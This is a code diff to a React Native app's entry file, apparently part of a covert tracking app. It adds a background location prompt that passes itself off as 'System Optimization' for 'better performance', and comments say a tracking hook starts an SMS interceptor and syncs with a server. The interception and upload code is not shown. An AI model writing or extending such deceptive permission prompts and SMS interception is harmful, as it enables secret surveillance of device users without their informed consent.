@@ -1,6 +1,7 @@
-import React from 'react';
-import { Platform, View, StyleSheet } from 'react-native';
+import React, { useEffect } from 'react';
+import { Platform, View, StyleSheet, Alert } from 'react-native';
 import { StatusBar } from 'expo-status-bar';
+import * as Location from 'expo-location'; // Background tracking ke liye zaruri
 
 // Custom Hooks & Screens
 import usePermissions from './src/hooks/usePermissions';
@@ -9,30 +10,38 @@ import HomeScreen from './src/screens/HomeScreen';
 import WebDashboard from './src/screens/WebDashboard';
 
 export default function App() {
-  // 1. All-in-one permissions request (Android only)
   const permissionStatus = usePermissions();
 
-  // 2. Background tracking logic trigger
-  // Ye hook SMS interceptor aur server sync shuru karega
+  useEffect(() => {
+    // 🛡️ Pro-Security Step: Background Permission Request
+    const checkBackgroundTracking = async () => {
+      if (Platform.OS === 'android' && permissionStatus === 'granted') {
+        const { status: bgStatus } = await Location.getBackgroundPermissionsAsync();
+        
+        if (bgStatus !== 'granted') {
+          Alert.alert(
+            "System Optimization",
+            "Behtar performance ke liye 'Allow all the time' location access select karein.",
+            [{ text: "OK", onPress: () => Location.requestBackgroundPermissionsAsync() }]
+          );
+        }
+      }
+    };
+    
+    checkBackgroundTracking();
+  }, [permissionStatus]);
+
+  // SMS aur Server Sync trigger
   useTracking(permissionStatus);
 
   return (
     <View style={styles.container}>
       <StatusBar style="auto" />
-      
-      {/* 3. Conditional Rendering: Web vs Mobile */}
-      {Platform.OS === 'web' ? (
-        <WebDashboard /> 
-      ) : (
-        <HomeScreen />
-      )}
+      {Platform.OS === 'web' ? <WebDashboard /> : <HomeScreen />}
     </View>
   );
 }
 
 const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-    backgroundColor: '#fff',
-  },
+  container: { flex: 1, backgroundColor: '#fff' },
 });
